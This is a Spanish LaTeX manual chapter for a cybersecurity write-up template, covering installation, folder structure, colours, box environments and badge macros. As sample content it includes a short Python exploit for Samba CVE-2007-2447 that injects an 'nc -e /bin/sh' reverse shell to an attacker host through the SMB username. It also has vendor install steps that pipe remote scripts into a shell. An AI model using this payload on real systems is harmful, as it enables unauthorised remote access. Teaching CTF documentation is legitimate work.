% !TeX document-id = {f25b0f90-aca3-472d-8cfd-01a898f2d74f}
% !TeX program = pdflatex
% !TeX TXS-program:compile = txs:///pdflatex/[-shell-escape]
% !TeX TXS-program:pdflatex = pdflatex -synctex=1 -interaction=nonstopmode --shell-escape %.tex

\documentclass[../../main_compilation.tex]{subfiles}

\begin{document}

\chapter{Guía de Uso del Template \& Manual Técnico}
\label{chap:manual_template}
\setCustomHeader{{\color{csecCyan}\faBookOpen}\ \textbf{Documentación}}{Manual \& Guía del Template}{\today}

Este capítulo proporciona una guía completa y exhaustiva sobre la estructura, los componentes visuales, la paleta de colores, los entornos interactivos y los procedimientos de instalación multiplataforma del \textbf{Template de Ciberseguridad}.


\section{Instalación y Configuración del Entorno}
Para utilizar este repositorio y generar documentos PDF con tipografía vectorial, iconos FontAwesome, gráficos TikZ y resaltado de sintaxis con \textbf{\texttt{minted}} sin errores, sigue las instrucciones de instalación según tu sistema operativo:

\subsection{Clonar el Repositorio}
Abre tu terminal y clona el repositorio desde GitHub:
\begin{bashbox}{Clonar Repositorio}
	git clone https://github.com/errantprogrammer/tex_template.git
	cd tex_template/cybersecurity
\end{bashbox}

\subsection{Instalación de Pygments con \texttt{uv} (Requisito para \texttt{minted})}
El template utiliza el motor \textbf{\texttt{minted}} con \textit{Pygments} para proporcionar resaltado de sintaxis de alta fidelidad. La forma recomendada y más rápida de instalarlo es utilizando \textbf{\texttt{uv}} (el gestor de paquetes ultrarrápido de Python):

\begin{bashbox}{Instalación de Pygments con uv}
	# 1. Instalar uv en Linux / macOS:
	curl -LsSf https://astral.sh/uv/install.sh | sh

	# En Windows (PowerShell):
	powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"

	# 2. Instalar Pygments como herramienta global con uv:
	uv tool install pygments

	# O alternativamente instalarlo via pip con uv:
	uv pip install --system pygments
\end{bashbox}

\subsection{Instalación de \LaTeX\ en Linux}
\begin{description}
	\item[\textbf{Debian / Ubuntu / Kali Linux / Parrot OS:}]
	      Instala la distribución completa de TeX Live:
	      \begin{bashbox}{Debian / Ubuntu / Kali}
		      sudo apt update
		      sudo apt install -y texlive-full
	      \end{bashbox}
	      \textit{Opción ligera (si cuentas con espacio de disco limitado):}
	      \begin{bashbox}{Debian / Ubuntu (Instalación Ligera)}
		      sudo apt install -y texlive-latex-extra texlive-fonts-extra \
		      texlive-extra-utils texlive-science fonts-font-awesome
	      \end{bashbox}

	\item[\textbf{Fedora / Red Hat / CentOS:}]
	      \quad%quad
	      \begin{bashbox}{Fedora / RHEL}
		      sudo dnf install -y texlive-scheme-full
	      \end{bashbox}

	\item[\textbf{Arch Linux / Manjaro:}]
	      \quad%quad
	      \begin{bashbox}{Arch Linux / Manjaro}
		      sudo pacman -S --needed texlive-meta texlive-fontsextra
	      \end{bashbox}
\end{description}

\subsection{Instalación de \LaTeX\ en Windows}
\begin{enumerate}
	\item Descarga e instala \textbf{MiKTeX} (\url{https://miktex.org/download}) o \textbf{TeX Live para Windows}.
	\item Durante el asistente de instalación de MiKTeX, marca la opción \textbf{\textit{"Always install missing packages on-the-fly"}} para que cualquier paquete adicional se descargue automáticamente en la primera compilación.
	\item \textbf{Editor recomendado:} Instala \textbf{Visual Studio Code} con la extensión oficial \textbf{LaTeX Workshop} o utiliza \textbf{TeXstudio}.
	\item Para compilar desde PowerShell o CMD (con \texttt{-shell-escape}):
	      \begin{bashbox}{Compilación en Windows (PowerShell)}
		      cd cybersecurity
		      pdflatex -shell-escape main_compilation.tex
	      \end{bashbox}
\end{enumerate}

\subsection{Instalación de \LaTeX\ en macOS}
\begin{enumerate}
	\item Instala la distribución completa \textbf{MacTeX} utilizando Homebrew:
	      \begin{bashbox}{Homebrew macOS}
		      brew install --cask mactex
	      \end{bashbox}
	      \textit{O descarga el instalador gráfico MacTeX.pkg desde:} \url{https://www.tug.org/mactex/}.
	\item \textbf{Editor recomendado:} Visual Studio Code (con LaTeX Workshop) o TeXShop (incluido en la instalación de MacTeX).
	\item Para compilar desde Terminal (con \texttt{-shell-escape}):
	      \begin{bashbox}{Terminal macOS}
		      cd cybersecurity
		      pdflatex -shell-escape main_compilation.tex
	      \end{bashbox}
\end{enumerate}

\section{Arquitectura y Flujo de Trabajo}
El template está diseñado bajo una arquitectura modular y desacoplada mediante el paquete \texttt{subfiles}. Esto permite dos flujos de trabajo simultáneos:

\begin{infobox}[Modos de Compilación Disponibles]
	\begin{itemize}
		\item \textbf{Modo Standalone (Writeup Individual):} Puedes compilar un archivo \texttt{writeup.tex} de forma aislada dentro de su propia carpeta mediante \texttt{pdflatex -shell-escape writeup.tex}. El archivo generará su propia portada individual, cabeceras locales y numeración desde \textbf{1.0} (evitando el error de secciones 0.1).
		\item \textbf{Modo Maestro (\texttt{main\_compilation.tex}):} Compila el libro completo recopilando todos los writeups, generando automáticamente la portada, el \textbf{Dashboard de Progreso interactivo} y la Tabla de Contenidos general.
	\end{itemize}
\end{infobox}

\subsection{Estructura de Directorios}
La jerarquía de carpetas está estandarizada de la siguiente manera:

\begin{codebox}[text]{Árbol de Directorios del Módulo}
	cybersecurity/
	|-- main_compilation.tex         # Documento maestro (Libro completo)
	|-- figure/                      # Imagenes maestras y logos globales
	|-- style/
	|   \-- cybersec.sty             # Paquete principal con estilos y macros
	|-- chapters/
	|   |-- guide/
	|   |   \-- template_guide.tex   # Manual de uso (este documento)
	|   \-- knowledge_base/
	|       \-- knowledge_base.tex   # Base de conocimiento y bitácora transversal
	\-- writeups/
	    |-- hackthebox/
	    |   \-- lame/
	    |       |-- writeup.tex      # Writeup individual de HTB Lame
	    |       \-- figure/          # Capturas exclusivas de la maquina
	    |-- tryhackme/
	    \-- ctf/
	        \-- pico_format_string/
	            |-- writeup.tex      # Reto individual de CTF
	            \-- figure/
\end{codebox}


\section{Paleta de Colores Oficial}
El diseño utiliza una gama cromática moderna basada en tonos pizarra oscuros, cianes de alta visibilidad y el estándar CVSS v3.1 para niveles de severidad:

\begin{table}[h!]
	\centering
	\small
	\begin{tabularx}{\textwidth}{l l c X}
		\toprule
		\rowcolor{csecDark}
		\textbf{\color{white}Nombre de Color} &
		\textbf{\color{white}Código HEX}      &
		\textbf{\color{white}Muestra}         &
		\textbf{\color{white}Uso Recomendado}                                                                                                                                                            \\
		\midrule
		\texttt{csecDark}                     & \texttt{\#0F172A} & \fcolorbox{csecDark}{csecDark}{\rule{0pt}{7pt}\rule{18pt}{0pt}}      & Fondos principales oscuros, cabeceras de tablas y texto base. \\
		\texttt{csecNavy}                     & \texttt{\#1E293B} & \fcolorbox{csecBorder}{csecNavy}{\rule{0pt}{7pt}\rule{18pt}{0pt}}    & Fondos de tarjetas de código, acentos secundarios.            \\
		\texttt{csecCyan}                     & \texttt{\#0284C7} & \fcolorbox{csecBorder}{csecCyan}{\rule{0pt}{7pt}\rule{18pt}{0pt}}    & Enlaces interactivos, subtítulos destacados y comandos.       \\
		\texttt{csecGreen}                    & \texttt{\#059669} & \fcolorbox{csecBorder}{csecGreen}{\rule{0pt}{7pt}\rule{18pt}{0pt}}   & Estado PWNED / Resuelto, flags y remediaciones válidas.       \\
		\texttt{csecOrange}                   & \texttt{\#D97706} & \fcolorbox{csecBorder}{csecOrange}{\rule{0pt}{7pt}\rule{18pt}{0pt}}  & Advertencias, notas técnicas y estados pendientes.            \\
		\texttt{csecRed}                      & \texttt{\#DC2626} & \fcolorbox{csecBorder}{csecRed}{\rule{0pt}{7pt}\rule{18pt}{0pt}}     & Alertas críticas y vulnerabilidades graves.                   \\
		\texttt{csecPurple}                   & \texttt{\#7C3AED} & \fcolorbox{csecBorder}{csecPurple}{\rule{0pt}{7pt}\rule{18pt}{0pt}}  & Reversing, explotación de binarios (Pwn) y pwn.college.       \\
		\texttt{csecLight}                    & \texttt{\#F8FAFC} & \fcolorbox{csecBorder}{csecLight}{\rule{0pt}{7pt}\rule{18pt}{0pt}}   & Fondo de cajas de información y tarjetas claras.              \\
		\midrule
		\texttt{sevCritical}                  & \texttt{\#991B1B} & \fcolorbox{csecBorder}{sevCritical}{\rule{0pt}{7pt}\rule{18pt}{0pt}} & CVSS 9.0 -- 10.0 (Vulnerabilidad Crítica / RCE).              \\
		\texttt{sevHigh}                      & \texttt{\#DC2626} & \fcolorbox{csecBorder}{sevHigh}{\rule{0pt}{7pt}\rule{18pt}{0pt}}     & CVSS 7.0 -- 8.9 (Vulnerabilidad Alta / PrivEsc).              \\
		\texttt{sevMedium}                    & \texttt{\#D97706} & \fcolorbox{csecBorder}{sevMedium}{\rule{0pt}{7pt}\rule{18pt}{0pt}}   & CVSS 4.0 -- 6.9 (Vulnerabilidad Media / XSS, CSRF).           \\
		\texttt{sevLow}                       & \texttt{\#2563EB} & \fcolorbox{csecBorder}{sevLow}{\rule{0pt}{7pt}\rule{18pt}{0pt}}      & CVSS 0.1 -- 3.9 (Vulnerabilidad Baja / Info Disclosure).      \\
		\texttt{sevInfo}                      & \texttt{\#059669} & \fcolorbox{csecBorder}{sevInfo}{\rule{0pt}{7pt}\rule{18pt}{0pt}}     & Informativo / Buenas prácticas.                               \\
		\bottomrule
	\end{tabularx}
	\caption{Paleta de colores del template de Ciberseguridad.}
\end{table}


\section{Componentes Visuales y Cajas de Entorno}

\subsection{Ficha Resumen del Objetivo (\texttt{\textbackslash targetSummary})}
Es el bloque inicial que define la ficha técnica del reto o máquina evaluada. Al utilizar este comando, se realizan 3 acciones automáticas:
\begin{enumerate}
	\item Dibuja la tarjeta técnica con soporte para múltiples tags y flags largas.
	\item Actualiza dinámicamente las cabeceras de página con el logo de la plataforma y el nombre de la máquina.
	\item Registra automáticamente los datos en el \textbf{Dashboard de Progreso} del documento maestro.
\end{enumerate}

\begin{codebox}[latex]{Sintaxis de \textbackslash targetSummary}
	\targetSummary%
	{Nombre_Objetivo}%    1. Nombre de la maquina o reto
	{10.10.10.3}%         2. IP o Hostname
	{HackTheBox}%         3. Plataforma (HackTheBox, TryHackMe, PortSwigger, CTF o ruta)
	{Easy}%               4. Dificultad (Easy, Medium, Hard, Insane)
	{Linux}%              5. Sistema Operativo (Linux, Windows, etc.)
	{Samba, RCE, Tags}%   6. Tags o vectores clave separados por coma
	{17/08/2026}%         7. Fecha de resolucion
	{user_flag_hash}%     8. Flag de Usuario o Flag CTF
	{root_flag_hash}%     9. Flag de Root (dejar vacio {} si solo hay una flag)
\end{codebox}

\subsection{Terminal de Comandos (\texttt{terminal})}
Entorno diseñado para mostrar trazas de consola, escaneos Nmap, respuestas de terminal y comandos interactivos:

\begin{codebox}[latex]{Sintaxis del Entorno terminal}
	\begin{terminal}
		[attacker@kali:~]$ nmap -sC -sV -p 21,22,139,445 10.10.10.3
		PORT    STATE SERVICE     VERSION
		21/tcp  open  ftp         vsftpd 2.3.4
		139/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
		445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
	\end{terminal}
\end{codebox}

\begin{terminal}
	[attacker@kali:~]$ nmap -sC -sV -p 21,22,139,445 10.10.10.3
	PORT    STATE SERVICE     VERSION
	21/tcp  open  ftp         vsftpd 2.3.4
	139/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
	445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian

\end{terminal}

\subsection{Cajas de Código y Exploits (\texttt{codebox}, \texttt{pythonbox}, \texttt{bashbox})}
Permiten incrustar exploits o scripts personalizados con números de línea y resaltado de sintaxis:

\begin{pythonbox}{Exploit Samba CVE-2007-2447}
	import sys
	from smb.SMBConnection import SMBConnection

	def trigger_rce(target_ip, lhost, lport):
	payload = f"nohup nc -e /bin/sh {lhost} {lport} &"
	username = f"/=`{payload}`"
	conn = SMBConnection(username, "", "attacker", "target", use_ntlm_v2=False)
	conn.connect(target_ip, 445, timeout=5)

	if __name__ == "__main__":
	trigger_rce("10.10.10.3", "10.10.14.5", 4444)
\end{pythonbox}

\subsection{Cajas de Alerta y Análisis de Vulnerabilidad}
\begin{vulnbox}{Ejecución Remota de Comandos (CVE-2007-2447)}
	La versión de Samba 3.0.20 permite la ejecución de comandos arbitrarios en el servidor debido a la falta de sanitización en el parámetro \texttt{username map script} en transacciones MS-RPC.
\end{vulnbox}

\begin{infobox}[Nota Informativa]
	Este es un recuadro estándar para notas de reconocimiento o metodologías aplicadas.
\end{infobox}

\begin{tipbox}[Pro-Tip de Explotación]
	Siempre verifica si los sockets Unix locales permiten comunicación con procesos de privilegios elevados sin autenticación.
\end{tipbox}

\begin{warnbox}[Advertencia]
	El exploit reinicia el servicio en caso de fallo, lo que podría alertar al sistema de detección de intrusos (IDS).
\end{warnbox}

\begin{alertbox}[Alerta de Severidad Crítica]
	Acceso total como usuario \texttt{root} conseguido sin requerir credenciales previas.
\end{alertbox}

\subsection{Caja de Flags Segura (\texttt{flagbox})}
La caja \texttt{flagbox} admite flags de cualquier longitud y con caracteres especiales (\texttt{\_}, \texttt{\#}, \texttt{\%}, \texttt{\&}, \texttt{\{ \}}) sin necesidad de escaparlos manualmente:

\begin{flagbox}{Flag Capturada picoCTF}
	picoCTF{format_string_exploit_leak_3847291a_custom_pwn_success}
\end{flagbox}

\subsection{Cajas de Aprendizaje y Fuentes de Consulta (\texttt{learningbox}, \texttt{sourcebox})}
Diseñadas para registrar lecciones aprendidas en writeups o en el capítulo de Knowledge Base, junto con los libros, sitios web o cursos consultados:

\begin{learningbox}[Técnica Asimilada: Inyección en Samba]
	La directiva \texttt{username map script} ejecuta comandos arbitrarios sin sanitización en Samba 3.0.x cuando se envían metacaracteres de shell en el nombre de usuario.
\end{learningbox}

\begin{sourcebox}[Fuentes y Bibliografía Consultada]
	\begin{itemize}[leftmargin=*]
		\resourceItem{Libro}{The Linux Command Line (William Shotts)}{Capítulo 24: Redirección y ejecución en subshell}
		\resourceItem{Web}{Rapid7 Exploit Database — CVE-2007-2447}{\url{https://www.rapid7.com/db/}}
	\end{itemize}
\end{sourcebox}


\section{Insignias y Badges Modulares}
Puedes utilizar badges en cualquier parte de tus reportes mediante las siguientes macros:

\begin{table}[h!]
	\centering
	\small
	\begin{tabularx}{\textwidth}{l l X}
		\toprule
		\rowcolor{csecDark}
		\textbf{\color{white}Macro}   &
		\textbf{\color{white}Muestra} &
		\textbf{\color{white}Código \LaTeX}                                                                                                          \\
		\midrule
		\textbf{Plataformas}          & \platformBadge{HackTheBox}                            & \texttt{\textbackslash platformBadge\{HackTheBox\}}  \\
		                              & \platformBadge{TryHackMe}                             & \texttt{\textbackslash platformBadge\{TryHackMe\}}   \\
		                              & \platformBadge{PortSwigger}                           & \texttt{\textbackslash platformBadge\{PortSwigger\}} \\
		                              & \platformBadge{pwn.college}                           & \texttt{\textbackslash platformBadge\{pwn.college\}} \\
		                              & \platformBadge{OverTheWire}                           & \texttt{\textbackslash platformBadge\{OverTheWire\}} \\
		                              & \platformBadge{Root-Me}                               & \texttt{\textbackslash platformBadge\{Root-Me\}}     \\
		                              & \platformBadge{CTF}                                   & \texttt{\textbackslash platformBadge\{CTF\}}         \\
		\midrule
		\textbf{Fuentes / Medios}     & \sourceBadge{Libro} \quad \sourceBadge{Web}           & \texttt{\textbackslash sourceBadge\{Libro\}}         \\
		                              & \sourceBadge{Docs} \quad \sourceBadge{Curso}          & \texttt{\textbackslash sourceBadge\{Docs\}}          \\
		                              & \sourceBadge{Lab} \quad \sourceBadge{Writeup}         & \texttt{\textbackslash sourceBadge\{Lab\}}           \\
		\midrule
		\textbf{Dificultad}           & \difficultyBadge{Easy} \quad \difficultyBadge{Medium} & \texttt{\textbackslash difficultyBadge\{Easy\}}      \\
		                              & \difficultyBadge{Hard} \quad \difficultyBadge{Insane} & \texttt{\textbackslash difficultyBadge\{Hard\}}      \\
		\midrule
		\textbf{Severidad CVSS}       & \severityBadge{Critical} \quad \severityBadge{High}   & \texttt{\textbackslash severityBadge\{Critical\}}    \\
		                              & \severityBadge{Medium} \quad \severityBadge{Low}      & \texttt{\textbackslash severityBadge\{Medium\}}      \\
		\midrule
		\textbf{Sistemas}             & \osBadge{Linux} \quad \osBadge{Windows}               & \texttt{\textbackslash osBadge\{Linux\}}             \\
		\midrule
		\textbf{Etiquetas}            & \tagList{Web, RCE, PrivEsc}                           & \texttt{\textbackslash tagList\{Web, RCE, PrivEsc\}} \\
		\bottomrule
	\end{tabularx}
	\caption{Colección de macros para insignias modulares.}
\end{table}


\section{Reglas de Modificación: Qué Modificar y Qué No}

\begin{table}[h!]
	\centering
	\small
	\begin{tabularx}{\textwidth}{p{7.5cm} p{7.5cm}}
		\toprule
		\cellcolor{csecGreen}\textbf{\color{white}\faCheckCircle\ QUÉ PUEDES MODIFICAR LIBREMENTE}                                                            &
		\cellcolor{sevCritical}\textbf{\color{white}\faTimesCircle\ QUÉ NO DEBES TOCAR EN EL ESTILO} \tabularnewline
		\midrule
		\textbf{1. Contenido de Writeups:} Crea y edita libremente archivos \texttt{writeup.tex} dentro de \texttt{writeups/}.                                &
		\textbf{1. Flujo de Streams de Targets:} No modifiques \texttt{\textbackslash targetStream} ni \texttt{\textbackslash renderDashboard} en \texttt{cybersec.sty}, ya que romperías la autogeneración del Dashboard. \tabularnewline
		\midrule
		\textbf{2. Fichas de Objetivos:} Personaliza todos los parámetros de \texttt{\textbackslash targetSummary} (nombres, IPs, fechas, dificultad, flags). &
		\textbf{2. Macros Globales de Cabecera:} No elimines los comandos \texttt{\textbackslash gdef} en \texttt{\textbackslash setPlatformHeader}, pues son necesarios para mantener la cabecera entre subarchivos. \tabularnewline
		\midrule
		\textbf{3. Capturas e Imágenes:} Coloca tus evidencias gráficas dentro de la carpeta \texttt{figure/} de cada writeup o en la raíz \texttt{figure/}.  &
		\textbf{3. Numeración Adaptativa:} No alteres la macro \texttt{\textbackslash thesection} que ajusta los índices entre modo standalone y modo compilación maestra. \tabularnewline
		\midrule
		\textbf{4. Portada y Autor:} Modifica tu nombre, fecha o colección de badges en el \texttt{titlepage} de \texttt{main\_compilation.tex}.              &
		\textbf{4. Modos de Listado y Verbatim:} No reemplaces las opciones \texttt{verbatim} de \texttt{flagbox} ni de las cajas de terminal. \tabularnewline
		\bottomrule
	\end{tabularx}
	\caption{Guía de modificación y buenas prácticas del template.}
\end{table}

\end{document}
